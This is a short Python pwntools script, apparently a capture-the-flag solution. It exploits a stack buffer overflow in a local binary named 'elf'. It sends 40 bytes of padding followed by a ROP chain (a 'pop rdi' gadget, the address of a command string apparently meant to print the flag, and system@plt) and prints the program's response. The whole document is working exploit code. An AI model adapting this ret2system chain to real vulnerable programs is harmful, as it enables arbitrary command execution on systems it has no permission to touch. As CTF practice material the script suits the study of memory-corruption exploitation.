from pwn import *
context.log_level = 'debug'

p="./elf"

sys_plt=0x00000000004005E0
catflag=0x0000000000601060
pop_rdi=0x0000000000400883

context.binary=p
io=process(p)

payload="a"*40+p64(pop_rdi)+p64(catflag)+p64(sys_plt)

io.recvuntil("> ")
io.sendline(payload)

print(io.recvline())
